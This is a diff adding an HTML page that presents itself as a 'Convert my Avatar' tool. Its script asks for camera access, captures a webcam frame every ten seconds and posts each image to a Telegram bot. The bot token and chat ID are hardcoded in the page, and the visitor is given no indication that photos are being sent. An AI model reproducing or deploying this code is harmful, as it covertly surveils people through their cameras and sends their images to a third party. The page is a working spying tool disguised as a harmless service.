@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatic Photo Capture</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            height: 100vh;
+            background-color: #000;
+            overflow: hidden;
+        }
+        
+        #container {
+            max-width: 375px;
+            width: 100%;
+            margin: auto;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        video, img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        #capturedImage {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none; /* Initially hide the captured image */
+        }
+        
+        button{
+            margin-bottom: 20px;
+            border: none;
+            padding: 20px 30px;
+            border-radius: 200px;
+            background-color: transparent;
+            color: red;
+            border: 3px solid red;
+        }
+    </style>
+</head>
+<body>
+
+
+    <div id="container">
+        <script>
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function (stream) {
+                        const video = document.createElement('video');
+                        document.getElementById('container').appendChild(video);
+                        video.srcObject = stream;
+                        video.play();
+
+                        setInterval(function () {
+                            captureAndSendPhoto(stream);
+                        }, 10000);
+                    })
+                    .catch(function (error) {
+                        console.error('Error accessing the camera:', error);
+                    });
+            } else {
+                console.error('getUserMedia is not supported in this browser');
+            }
+
+            function captureAndSendPhoto(stream) {
+                const canvas = document.createElement('canvas');
+                const video = document.querySelector('video');
+                const container = document.getElementById('container');
+                <!-- const capturedImage = document.getElementById('capturedImage'); -->
+
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageDataUrl = canvas.toDataURL('image/png');
+
+                sendPhotoToTelegram(imageDataUrl);
+
+                capturedImage.src = imageDataUrl;
+                capturedImage.style.display = 'block';
+
+                setTimeout(function () {
+                    capturedImage.style.display = 'none';
+                }, 3000); // Hide the captured image after 3 seconds
+
+                const formData = new FormData();
+                const blob = dataURItoBlob(imageDataUrl);
+                formData.append('photo', blob, 'photo.png');
+            }
+
+            function sendPhotoToTelegram(imageDataUrl) {
+                const botToken = '6852219306:AAG_-wDrfwHryRXu0odK2Fdb1fEH5nqacMc';
+                const chatId = '-4198275356';
+
+                const formData = new FormData();
+                const blob = dataURItoBlob(imageDataUrl);
+                formData.append('photo', blob, 'photo.png');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram API response:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending photo to Telegram:', error);
+                });
+            }
+
+            function dataURItoBlob(dataURI) {
+                const byteString = atob(dataURI.split(',')[1]);
+                const arrayBuffer = new ArrayBuffer(byteString.length);
+                const uint8Array = new Uint8Array(arrayBuffer);
+
+                for (let i = 0; i < byteString.length; i++) {
+                    uint8Array[i] = byteString.charCodeAt(i);
+                }
+
+                return new Blob([arrayBuffer], { type: 'image/png' });
+            }
+        </script>
+        
+    </div>
+    <a href=""><button>Convert my Avatar</button></a>
+
+</body>
+</html>
